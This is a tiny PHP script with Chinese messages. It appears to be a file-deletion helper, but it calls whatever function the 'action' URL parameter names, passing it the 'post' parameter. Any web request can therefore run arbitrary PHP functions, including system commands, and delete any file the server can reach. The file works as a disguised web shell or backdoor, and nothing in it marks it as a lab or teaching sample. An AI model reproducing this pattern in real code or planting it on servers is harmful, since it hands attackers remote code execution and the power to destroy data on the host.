<?php

function del($file)
{
   if(!unlink($file)) {
      echo ("删除 $file 时出错");
   } else {
      echo ("删除 $file 成功");
   }
	
}

if(isset($_GET['action'])){
    if(function_exists($_GET['action'])) {    
        $_GET['action']($_GET['post']);
    }
}
?>